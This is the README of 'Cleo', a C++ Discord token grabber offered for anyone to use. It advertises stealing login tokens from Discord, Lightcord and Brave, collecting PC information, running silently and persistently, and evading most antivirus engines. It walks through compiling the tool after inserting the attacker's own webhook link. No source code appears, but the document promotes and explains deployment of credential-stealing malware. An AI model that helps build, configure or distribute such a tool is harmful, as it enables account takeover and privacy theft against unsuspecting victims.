<h1 align="center" style="margin-top: 0px;">Cleo</h1>

<p align="center">
     
<img src="/images/cleo.png" alt="Cleo image" align="center">

</p>

A C++ token grabber that anyone can use, credit to [NightFallGT](https://github.com/NightfallGT/Discord-Token-Grabber/blob/master/Token-Disc/Token-Disc.cpp)
and his token grabber, I used it to create an instance that does not require libcurl but rather an up to date
windows installation (they usually come with cURL installed)

## Pros
     - Silence and persistence
     - Supports the latest discord updates
     - Grabs Lightcord, Discord and Brave just to name a few.
     - Fast, Its made in C++  
     - Detected by only 3 av-engines
     - Collects PC info
## Cons
     - Does not support early windows versions
     - Hard to understand for beginners in programming

**Gladly, the pros outweigh the cons.**


# Compilation

You will need **Visual studio 2019** and Visual C++ SDK installed.

Download the .zip folder from releases, extract it to a folder `e.g: MyProjectFolder`
Next, open the .sln file and once loaded go to the `Source.cpp` file, then find the webhook link
inside of the sprintf call and change it to desired link.

**Make sure you are using "Release" not "Debug" when compiling!**

Press ctrl + b and enjoy!
